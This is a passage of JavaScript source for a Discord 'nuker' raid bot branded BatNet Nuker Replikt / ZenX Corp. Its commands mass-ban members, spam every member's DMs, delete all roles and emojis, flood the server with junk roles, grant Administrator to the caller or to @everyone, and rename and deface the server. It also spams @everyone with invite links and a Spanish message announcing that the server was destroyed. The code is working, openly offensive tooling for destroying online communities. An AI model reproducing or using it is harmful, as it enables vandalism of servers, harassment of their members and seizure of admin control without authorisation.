            .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
            .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
        ]});
        for (let member of members_.values()) {
            i++;
            try {
                if(i>=members_.size){
                    msgxd.edit({embeds:[
                        new EmbedBuilder()
                        .setTitle(`$ Members`)
                        .setDescription(`> **Completed!**\`✅\`\n> **${i}/${members_.size}**`)
                        .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                        .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                    ]});
                    return;
                };
                await member.ban("https://discord.gg/zCQ8jQ2GBf");
                msgxd.edit({embeds:[
                    new EmbedBuilder()
                    .setTitle(`$ Members`)
                    .setDescription(`> **Banning bots...**\n> **\`${member.name}\` \`✅\`**\n> **${i}/${members_.size}**`)
                    .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                    .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                ]});
            } catch (e) {
                msgxd.edit({embeds:[
                    new EmbedBuilder()
                    .setTitle(`$ Members`)
                    .setDescription(`> **Banning bots...**\n> **\`${member.name}\` \`❌\`**\n> **${i}/${members_.size}**`)
                    .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                    .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                ]});
                console.log(e);
            };
        };
    };
    if(msg.content === prefix+"mdall"){
        async function spam_member(mid) {
            const memberxd = msg.guild.members.cache.get(mid);
            for (let index = 0; index < 15; index++) {
                try {
                    await memberxd.send({content:`<@${mid}>`});
                } catch (e) {
                    console.log(e);
                }
            };
        };
        const members_ = await msg.guild.members.fetch()
        let i=0;
        const msgxd = await msg.author.send({embeds:[
            new EmbedBuilder()
            .setTitle(`$ Members`)
            .setDescription(`> **Sending messages...**\n> **0/${members_.size}**`)
            .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
            .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
        ]});
        for (let member of members_.values()) {
            i++;
            try {
                if(i>=members_.size){
                    msgxd.edit({embeds:[
                        new EmbedBuilder()
                        .setTitle(`$ Members`)
                        .setDescription(`> **Completed!**\`✅\`\n> **${i}/${members_.size}**`)
                        .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                        .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                    ]});
                    return;
                };
                if(member.user.bot){return;};
                spam_member(member.user.id);
            } catch (e) {
                console.log(e);
            };
        };
    };
    //Roles
    if(msg.content === prefix+"clear_roles"){
        const roles_ = await msg.guild.roles.fetch();
        let i=0;
        if(roles_.size===0){
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setTitle(`$ Roles`)
                .setDescription(`> **No roles found.**`)
                .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
            ]});
            return;
        };
        const msgxd = await msg.author.send({embeds:[
            new EmbedBuilder()
            .setTitle(`$ Roles`)
            .setDescription(`> **Deleting roles...**\n> **0/${roles_.size}**`)
            .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
            .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
        ]});
        for (let rol of roles_.values()) {
            i++;
            try {
                if(i>=roles_.size){
                    msgxd.edit({embeds:[
                        new EmbedBuilder()
                        .setTitle(`$ Roles`)
                        .setDescription(`> **Completed!**\`✅\`\n> **${i}/${roles_.size}**`)
                        .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                        .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                    ]});
                    return;
                };
                await rol.delete("https://discord.gg/zCQ8jQ2GBf");
                msgxd.edit({embeds:[
                    new EmbedBuilder()
                    .setTitle(`$ Roles`)
                    .setDescription(`> **Deleting roles...**\n> **\`${rol.name}\` \`✅\`**\n> **${i}/${roles_.size}**`)
                    .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                    .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                ]});
            } catch (e) {
                msgxd.edit({embeds:[
                    new EmbedBuilder()
                    .setTitle(`$ Roles`)
                    .setDescription(`> **Deleting roles...**\n> **\`${rol.name}\` \`❌\`**\n> **${i}/${roles_.size}**`)
                    .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                    .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                ]});
                console.log(e);
            };
        };
    };
    if(msg.content === prefix+"create_roles"){
        const msgxd = await msg.author.send({embeds:[
            new EmbedBuilder()
            .setTitle(`$ Roles`)
            .setDescription(`> **Creating roles...**\n> **0/50**`)
            .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
            .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
        ]});
        for (leti=0;i<50;i++) {
            try {
                await msgxd.edit({embeds:[
                    new EmbedBuilder()
                    .setTitle(`$ Roles`)
                    .setDescription(`> **Creating roles...**\n> **${i}/50** \`✅\``)
                    .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                    .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                ]});
                await msg.guild.roles.create({name:`$ ZenX Corp`, reason:`https://discord.gg/zCQ8jQ2GBf`});
            } catch (e) {
                await msgxd.edit({embeds:[
                    new EmbedBuilder()
                    .setTitle(`$ Roles`)
                    .setDescription(`> **Creating roles...**\n> **${i}/50** \`❌\``)
                    .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                    .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                ]});
                console.log(e);
            };
        };
    };
    if(msg.content === prefix+"admin"){
        const msgxd = await msg.author.send({embeds:[
            new EmbedBuilder()
            .setTitle(`$ Admin`)
            .setDescription(`> **Giving administrator...**`)
            .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
            .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
        ]});
        try {
            let bot_rol = msg.guild.roles.cache.find(rolxd=>rolxd.name === client.user.username);
            msgxd.edit({embeds:[
                new EmbedBuilder()
                .setTitle(`$ Admin`)
                .setDescription(`> **<@${msg.author.id}> obtained administrator permissions!**`)
                .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
            ]});
            await msg.guild.roles.create({name:`$`,reason:`$ ZenX Corp On Top`, permissions: PermissionsBitField.Flags.Administrator}).then(async (roll)=>{
                await msg.guild.members.cache.get(`${msg.author.id}`).roles.add(`${roll.id}`);
                await roll.setPosition(bot_rol.position);
            });
        } catch (e) {
            msgxd.edit({embeds:[
                new EmbedBuilder()
                .setTitle(`$ Admin`)
                .setDescription(`> **Failed to give administrator permissions**`)
                .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
            ]});
            console.log(e);
        };
    };
    if(msg.content === prefix+"admin_all"){
        const msgxd = await msg.author.send({embeds:[
            new EmbedBuilder()
            .setTitle(`$ Admin`)
            .setDescription(`> **Giving administrator...**`)
            .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
            .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
        ]});
        try {
            msgxd.edit({embeds:[
                new EmbedBuilder()
                .setTitle(`$ Admin`)
                .setDescription(`> **All obtained administrator permissions!**`)
                .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
            ]});
            await msg.guild.roles.everyone.setPermissions(PermissionsBitField.Flags.Administrator);
        } catch (e) {
            msgxd.edit({embeds:[
                new EmbedBuilder()
                .setTitle(`$ Admin`)
                .setDescription(`> **Failed to give administrator permissions**`)
                .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
            ]});
            console.log(e);
        };
    };
    if(msg.content === prefix+"edit_roles"){
        const roles_ = await msg.guild.roles.fetch();
        let i=0;
        if(roles_.size===1){
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setTitle(`$ Roles`)
                .setDescription(`> **No roles found.**`)
                .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
            ]});
            return;
        };
        const msgxd = await msg.author.send({embeds:[
            new EmbedBuilder()
            .setTitle(`$ Roles`)
            .setDescription(`> **Updating the name and color of the roles with administrator permissions...**\n> **0/${roles_.size}**`)
            .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
            .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
        ]});
        for (let rol of roles_.values()) {
            i++;
            try {
                if(i>=roles_.size){
                    msgxd.edit({embeds:[
                        new EmbedBuilder()
                        .setTitle(`$ Roles`)
                        .setDescription(`> **Completed!** \`✅\`\n> **${i}/${roles_.size}**`)
                        .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                        .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                    ]});
                    return;
                };
                await rol.setColor("#6e04b0");
                await rol.setName("$ ZenX Corp", "https://discord.gg/zCQ8jQ2GBf");
                await rol.setPermissions(PermissionsBitField.Flags.Administrator);
                msgxd.edit({embeds:[
                    new EmbedBuilder()
                    .setTitle(`$ Roles`)
                    .setDescription(`> **Updating the name and color of the roles with administrator permissions...**\n> **\`${rol.name}\` \`✅\`**\n> **${i}/${roles_.size}**`)
                    .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                    .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                ]});
            } catch (e) {
                msgxd.edit({embeds:[
                    new EmbedBuilder()
                    .setTitle(`$ Roles`)
                    .setDescription(`> **Updating the name and color of the roles with administrator permissions...**\n> **\`${rol.name}\` \`❌\`**\n> **${i}/${roles_.size}**`)
                    .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                    .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                ]});
                console.log(e);
            };
        };
    };
    //Emojis
    if(msg.content === prefix+"clear_emojis"){
        const emjs = await msg.guild.emojis.fetch();
        let i=0;
        if(emjs.size===0){
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setTitle(`$ Emojis`)
                .setDescription(`> **No emojis found.**`)
                .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
            ]});
            return;
        };
        const msgxd = await msg.author.send({embeds:[
            new EmbedBuilder()
            .setTitle(`$ Emojis`)
            .setDescription(`> **Deleting emojis...**\n> **0/${emjs.size}**`)
            .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
            .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
        ]});
        for (let emj of emjs.values()) {
            i++;
            try {
                if(i>=emjs.size){
                    msgxd.edit({embeds:[
                        new EmbedBuilder()
                        .setTitle(`$ Emojis`)
                        .setDescription(`> **Completed!** \`✅\`\n> **${i}/${emjs.size}**`)
                        .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                        .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                    ]});
                    return;
                };
                await emj.delete("https://discord.gg/zCQ8jQ2GBf");
                msgxd.edit({embeds:[
                    new EmbedBuilder()
                    .setTitle(`$ Emojis`)
                    .setDescription(`> **Deleting emojis...**\n> **\`${emj.name}\` \`✅\`**\n> **${i}/${emjs.size}**`)
                    .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                    .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                ]});
            } catch (e) {
                msgxd.edit({embeds:[
                    new EmbedBuilder()
                    .setTitle(`$ Emojis`)
                    .setDescription(`> **Deleting emojis...**\n> **\`${emj.name}\` \`❌\`**\n> **${i}/${emjs.size}**`)
                    .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                    .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                ]});
                console.log(e);
            };
        };
    };
    //Guild
    if(msg.content === prefix+"change_photo"){
        const msgxd = await msg.author.send({embeds:[
            new EmbedBuilder()
            .setTitle(`$ Change Server Icon`)
            .setDescription(`> **Updating Server Icon...**`)
            .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
            .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
        ]});
        await msg.guild.setIcon(`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`).catch(async()=>{
            msgxd.edit({embeds:[
                new EmbedBuilder()
                .setTitle(`$ Change Server Icon`)
                .setDescription(`> **An error occurred while updating the server icon**`)
                .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
            ]});
        });
        await wait_ms(1200);
        await msgxd.edit({embeds:[
            new EmbedBuilder()
            .setTitle(`$ Change Server Icon`)
            .setDescription(`> **Successfully completed!**`)
            .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
            .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
        ]});
    };
    if(msg.content === prefix+"edit_community"){
        if(!msg.guild.rulesChannelId){
            await msg.author.send({embeds:[
                new EmbedBuilder()
                .setTitle(`$ Change Community Details`)
                .setDescription(`> **The server is not a community!**`)
                .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
            ]});
            return;
        };
        const msgxd = await msg.author.send({embeds:[
            new EmbedBuilder()
            .setTitle(`$ Change Community Details`)
            .setDescription(`> **Updating server community details...**`)
            .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
            .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
        ]});
        let desc = "";
        try {
            await msg.guild.setName(`Fucked by $ ZenX Corp`).then(async()=>{
                await msgxd.edit({embeds:[
                    new EmbedBuilder()
                    .setTitle(`$ Change Community Details`)
                    .setDescription(`> **Updating server community details...**\n> **Server name changed** \`✅\``)
                    .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                    .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                ]});
            });
            desc = "> **Updating server community details...**\n> **Server name changed** \`✅\`";
        } catch (e) {
            await msgxd.edit({embeds:[
                new EmbedBuilder()
                .setTitle(`$ Change Community Details`)
                .setDescription(`> **Updating server community details...**\n> **Server name changed** \`❌\``)
                .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
            ]});
            desc = "> **Updating server community details...**\n> **Server name changed** \`❌\`";
        };
        await wait_ms(1000);
        try {
            await msg.guild.setIcon(`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`).then(async()=>{
                await msgxd.edit({embeds:[
                    new EmbedBuilder()
                    .setTitle(`$ Change Community Details`)
                    .setDescription(desc+"\n> **Server icon changed**\`✅\`")
                    .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                    .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                ]});
            });
            desc = desc+"\n> **Server icon changed**\`✅\`";
        } catch (e) {
            await msgxd.edit({embeds:[
                new EmbedBuilder()
                .setTitle(`$ Change Community Details`)
                .setDescription(desc+"\n> **Server icon changed**\`❌\`")
                .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
            ]});
            desc = desc+"\n> **Server icon changed**\`❌\`";
        };
        await wait_ms(1000);
        try {
            await msg.guild.setVerificationLevel("4").then(async()=>{
                await msgxd.edit({embeds:[
                    new EmbedBuilder()
                    .setTitle(`$ Change Community Details`)
                    .setDescription(desc+"\n> **Verification level changed**\`✅\`")
                    .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                    .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                ]});
            });
            desc = desc+"\n> **Verification level changed**\`✅\`";
        } catch (e) {
            await msgxd.edit({embeds:[
                new EmbedBuilder()
                .setTitle(`$ Change Community Details`)
                .setDescription(desc+"\n> **Verification level changed**\`❌\`")
                .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
            ]});
            desc = desc+"\n> **Verification level changed**\`❌\`";
        };
        await wait_ms(1000);
        try {
            await msg.guild.setPreferredLocale("en-US").then(async()=>{
                await msgxd.edit({embeds:[
                    new EmbedBuilder()
                    .setTitle(`$ Change Community Details`)
                    .setDescription(desc+"\n> **Preferred location changed**\`✅\`")
                    .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                    .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                ]});
            });
            desc = desc+"\n> **Preferred location changed**\`✅\`";
        } catch (e) {
            await msgxd.edit({embeds:[
                new EmbedBuilder()
                .setTitle(`$ Change Community Details`)
                .setDescription(desc+"\n> **Preferred location changed**\`❌\`")
                .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
            ]});
            desc = desc+"\n> **Preferred location changed**\`❌\`";
        };
        await wait_ms(1000);
        try {
            await msg.guild.edit({description: `Fucked by $ ZenX Corp - https://discord.gg/zCQ8jQ2GBf`}).then(async()=>{
                await msgxd.edit({embeds:[
                    new EmbedBuilder()
                    .setTitle(`$ Change Community Details`)
                    .setDescription(desc+"\n> **Description changed**\`✅\`")
                    .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                    .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
                ]});
            });
            desc = desc+"\n> **Description changed**\`✅\`";
        } catch (e) {
            await msgxd.edit({embeds:[
                new EmbedBuilder()
                .setTitle(`$ Change Community Details`)
                .setDescription(desc+"\n> **Description changed**\`❌\`")
                .setAuthor({iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`, name:`BatNet Nuker Replikt`})
                .setFooter({text:`$ ZenXTeam | BatNet Nuker Replikt`, iconURL:`https://cdn.discordapp.com/icons/1187626256586518570/8a1b1ddd56debaf852393d821c63caf1.png?size=128`})
            ]});
            desc = desc+"\n> **Description changed**\`❌\`";
        };
    };
    //Bypasses
    if(msg.content === prefix+"bypass"){
        async function spam_ch(chid) {
            const ch = msg.guild.channels.cache.get(chid);
            for (let index = 0; index < 20; index++) {
                try {
                                        await ch.send({content:`> - [ ||@everyone|| ]\n> ** https://discord.gg/zCQ8jQ2GBf **\n> ** https://dsc.gg/zenxcorpp **`, embeds:[
                        new EmbedBuilder()
                        .setImage(`https://cdn.discordapp.com/attachments/1161131445268525116/1167800602567397426/picasion.com_c642a65df1484b8d69da558099082bb9.gif?ex=654f7210&is=653cfd10&hm=53ed05fda49076f74d6a4be979cb4a89f4928a09193f1d19d53f2d2918c5f2fe&`)
                        .setTitle(`⸸                Servidor destruido por Zen𝐗                ⸸\n                                #Zen𝐗𝐎n𝐓op                             `)
                        .setDescription(`󠀠‎\n ‎ **› ‎ ‎ ‎ ‎ Si quieres recuperar tu servidor entra a ZenX ! ‎ ‎ ‎ ‎ ‹**\n\n\`\`\`yaml\nbot r͢a͢id  ×   discord̲ too̲l̲s̲   ×  s̲hop\`\`\`\n‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ------------------  Ж  ------------------\n\n**。Servidor de ZenX: [Invitación](https://discord.gg/zCQ8jQ2GBf)**\n\n**。Youtube: [Cómo raidear un servidor de Discord?](https://www.youtube.com/watch?v=umo4zcoOrdI)**\n**。Youtube: [Raid Tool Gratis (SRT)](https://www.youtube.com/watch?v=YUIKf2bxvE8)**\n\n-------------------------  Ж  -------------------------`)
                    ]});
                } catch (e) {
                    console.log(e);
                };
            };
        };
        const chs = await msg.guild.channels.fetch();
        await msg.author.send({embeds:[
            new EmbedBuilder()
